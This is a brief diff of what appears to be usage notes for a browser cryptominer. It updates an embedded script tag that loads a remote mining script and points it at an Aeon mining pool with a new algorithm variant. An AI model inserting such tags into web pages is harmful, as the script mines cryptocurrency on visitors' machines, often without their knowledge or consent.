@@ -17,7 +17,7 @@ Attention: Stellite and IPBC created their own PoW variants....so mining is disa
 <br><br>
 Attention: Aeon Cryptonight-lite ?algo=cn-lite?variant=1 ---> 06.06.18 | FORK AT BLOCK 963500 ---> use variant=1 now
 <br><br>
-<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=0?jason=mine.supportaeon.com:3333"> </script>
+<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=mine.supportaeon.com:3333"> </script>
 <br><br>
 Attention: Special Case for some custom variant fork coins: Turtlecoin need ?algo=cn-lite?variant=1
 <br><br>
